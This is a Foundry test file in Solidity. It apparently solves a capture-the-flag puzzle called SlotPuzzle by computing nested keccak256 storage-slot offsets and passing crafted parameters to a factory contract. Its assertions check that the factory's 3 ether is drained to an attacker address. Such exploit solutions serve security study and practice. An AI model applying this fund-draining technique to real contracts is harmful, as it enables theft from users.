// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import {SlotPuzzle} from "src/SlotPuzzle.sol";
import {SlotPuzzleFactory} from "src/SlotPuzzleFactory.sol";
import {Parameters,Recipients} from "src/interface/ISlotPuzzleFactory.sol";


contract SlotPuzzleTest is Test {
    SlotPuzzle public slotPuzzle;
    SlotPuzzleFactory public slotPuzzleFactory;
    address aravindh;

    function setUp() public {
        slotPuzzleFactory = new SlotPuzzleFactory{value: 3 ether}();
        aravindh = makeAddr("aravindh");
    }

    function testHack() public {
        vm.startPrank(aravindh,aravindh);
        assertEq(address(slotPuzzleFactory).balance, 3 ether, "weth contract should have 3 ether");

        Recipients[] memory receipt = new Recipients[](3);
        receipt[0] = Recipients(aravindh,1 ether);
        receipt[1] = Recipients(aravindh,1 ether);
        receipt[2] = Recipients(aravindh,1 ether);

        bytes32 slotOffset = getHash(
            aravindh,
            block.number,
            block.timestamp,
            address(slotPuzzleFactory),
            block.prevrandao,
            block.coinbase,
            block.chainid,
            address(uint160(uint256(blockhash(block.number - block.basefee))))
        );

        slotPuzzleFactory.deploy(
            Parameters(
            3,
            420,
            receipt,
            abi.encodePacked(bytes32(uint256(324)),slotOffset))
        );  

        assertEq(address(slotPuzzleFactory).balance, 0, "weth contract should have 0 ether");
        assertEq(address(aravindh).balance, 3 ether, "aravindh should have 3 ether");

        
        vm.stopPrank();
    }

    function getHash(
        address varsOne,
        uint256 varsTwo,
        uint256 varsThree,
        address varsFour,
        uint256 varsFive,
        address varsSix,
        uint256 varsSevan,
        address varsEight
    ) internal pure returns (bytes32){
        uint256 slotKeyOne = getKeccak256(varsTwo, getKeccak256(uint256(uint160(varsOne)),1)) + 1;
        uint256 slotKeyTwo = getKeccak256(uint256(uint160(varsFour)),getKeccak256(varsThree,slotKeyOne)) + 1;
        uint256 slotKeyThree = getKeccak256(uint256(uint160(varsSix)),getKeccak256(varsFive,slotKeyTwo)) + 1;
        uint256 slotKeyFour = getKeccak256(uint256(uint160(varsEight)),getKeccak256(varsSevan,slotKeyThree)) + 0;
        bytes32 arraySlotKey = keccak256(abi.encodePacked(slotKeyFour));

        return arraySlotKey;
    }
    function getKeccak256(uint256 keyOne,uint256 keyTwo) public pure returns (uint256) {
        return uint256(keccak256(abi.encodePacked(keyOne, keyTwo))); 
    }
}